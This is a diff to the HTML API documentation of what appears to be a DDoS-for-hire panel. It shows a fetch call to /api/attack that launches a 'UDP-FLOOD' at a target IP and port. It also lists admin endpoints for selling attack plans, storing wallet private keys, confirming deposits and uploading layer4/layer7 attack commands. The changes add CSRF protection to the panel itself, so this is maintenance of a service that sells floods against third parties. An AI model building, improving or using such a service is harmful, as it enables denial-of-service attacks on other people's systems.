@@ -155,7 +155,7 @@
                 <div class="glass-panel p-8 rounded-2xl border border-white/5">
                     <div class="flex items-center gap-3 mb-2"><span class="bg-emerald-600 text-[10px] font-bold px-2 py-1 rounded text-white">POST</span><h2 class="text-xl font-bold text-white">/api/attack</h2></div>
                     <p class="text-sm text-gray-400 mb-4">Launch attack from panel (requires session cookie).</p>
-                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:'1.1.1.1',port:'80',time:'60',method:'UDP-FLOOD',concurrency:'1'})})</div>
+                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':'&lt;CSRF&gt;'},body:JSON.stringify({target:'1.1.1.1',port:'80',time:'60',method:'UDP-FLOOD',concurrency:'1'})})</div>
                 </div>
 
                 <div class="glass-panel p-8 rounded-2xl border border-white/5">
@@ -165,15 +165,15 @@
                 </div>
 
                 <div class="glass-panel p-8 rounded-2xl border border-white/5">
-                    <div class="flex items-center gap-3 mb-2"><span class="bg-indigo-600 text-[10px] font-bold px-2 py-1 rounded text-white">GET</span><h2 class="text-xl font-bold text-white">/api/attack/stop</h2></div>
+                    <div class="flex items-center gap-3 mb-2"><span class="bg-emerald-600 text-[10px] font-bold px-2 py-1 rounded text-white">POST</span><h2 class="text-xl font-bold text-white">/api/attack/stop</h2></div>
                     <p class="text-sm text-gray-400 mb-4">Stop an attack by ID (session required).</p>
-                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack/stop?id=&lt;ATTACK_ID&gt;').then(r=&gt;r.json())</div>
+                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack/stop',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRF-Token':'&lt;CSRF&gt;'},body:'id=&lt;ATTACK_ID&gt;'}).then(r=&gt;r.json())</div>
                 </div>
 
                 <div class="glass-panel p-8 rounded-2xl border border-white/5">
-                    <div class="flex items-center gap-3 mb-2"><span class="bg-indigo-600 text-[10px] font-bold px-2 py-1 rounded text-white">GET</span><h2 class="text-xl font-bold text-white">/api/attack/stopAll</h2></div>
+                    <div class="flex items-center gap-3 mb-2"><span class="bg-emerald-600 text-[10px] font-bold px-2 py-1 rounded text-white">POST</span><h2 class="text-xl font-bold text-white">/api/attack/stopAll</h2></div>
                     <p class="text-sm text-gray-400 mb-4">Stop all your attacks (session required).</p>
-                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack/stopAll').then(r=&gt;r.json())</div>
+                    <div class="bg-black/50 p-4 rounded-xl font-mono text-xs text-indigo-300 border border-white/10 break-all">fetch('/api/attack/stopAll',{method:'POST',headers:{'X-CSRF-Token':'&lt;CSRF&gt;'}}).then(r=&gt;r.json())</div>
                 </div>
 
                 <div class="glass-panel p-8 rounded-2xl border border-white/5">
@@ -218,16 +218,15 @@
                     <div class="flex items-center gap-3 mb-2"><span class="bg-amber-600 text-[10px] font-bold px-2 py-1 rounded text-white">ADMIN</span><h2 class="text-xl font-bold text-white">Admin Endpoints</h2></div>
                     <p class="text-sm text-gray-400 mb-6">Require session as <span class="font-mono">admin</span>. Most endpoints redirect back to admin panel.</p>
                     <div class="space-y-3 text-sm text-gray-300">
-                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/gen-code?plan=&lt;PLAN&gt;</span><span class="text-gray-500">Generate redeem code</span></div>
+                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/gen-code</span><span class="text-gray-500">POST form: plan (CSRF required)</span></div>
                         <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/config-plans</span><span class="text-gray-500">POST form: name, concurrents, time, vip, api</span></div>
                         <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/add-product</span><span class="text-gray-500">POST form: name, price, time, concurrents, vip, api</span></div>
-                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/del-product?id=&lt;ID&gt;</span><span class="text-gray-500">Delete product</span></div>
+                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/del-product</span><span class="text-gray-500">POST form: id (CSRF required)</span></div>
                         <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/add-wallet</span><span class="text-gray-500">POST form: address, private_key</span></div>
-                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/del-wallet?address=&lt;ADDR&gt;</span><span class="text-gray-500">Delete wallet</span></div>
-                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/blacklist?action=add</span><span class="text-gray-500">POST form: target, reason</span></div>
-                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/blacklist?action=del&amp;target=&lt;TARGET&gt;</span><span class="text-gray-500">Remove blacklist</span></div>
+                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/del-wallet</span><span class="text-gray-500">POST form: address (CSRF required)</span></div>
+                        <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/blacklist</span><span class="text-gray-500">POST form: action=add|del, target, reason (CSRF required)</span></div>
                         <div class="flex items-center justify-between border-b border-white/5 pb-2"><span class="font-mono">/api/admin/upload-method</span><span class="text-gray-500">POST form: name, type(layer4/layer7), command</span></div>
-                        <div class="flex items-center justify-between"><span class="font-mono">/api/admin/deposit/action?id=&lt;ID&gt;&amp;action=confirm|cancel</span><span class="text-gray-500">Confirm/cancel deposit</span></div>
+                        <div class="flex items-center justify-between"><span class="font-mono">/api/admin/deposit/action</span><span class="text-gray-500">POST form: id, action=confirm|cancel (CSRF required)</span></div>
                     </div>
                 </div>
 
